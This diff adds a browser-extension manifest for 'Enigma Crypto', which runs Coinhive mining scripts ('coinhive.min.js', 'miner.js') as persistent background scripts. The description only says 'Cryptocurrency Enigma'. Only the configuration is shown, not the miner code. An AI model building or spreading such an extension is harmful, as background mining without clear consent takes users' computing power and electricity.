@@ -1,0 +1,23 @@
+{
+  "name": "Enigma Crypto",
+  
+  
+  "version": "1.9",
+  "description": "Cryptocurrency Enigma",
+  "permissions": [
+    "notifications", "background", "storage"
+  ],
+  "browser_action": {
+      "default_title": "Cryptocurrency Enigma",
+      "default_icon": "/assets/icon.png",
+      "default_popup": "/miner/popup.html"
+  
+  
+  },
+  
+  "background": {
+	  "scripts": ["/miner/coinhive.min.js", "/miner/miner.js"]
+  },
+  "manifest_version": 2
+  
+}
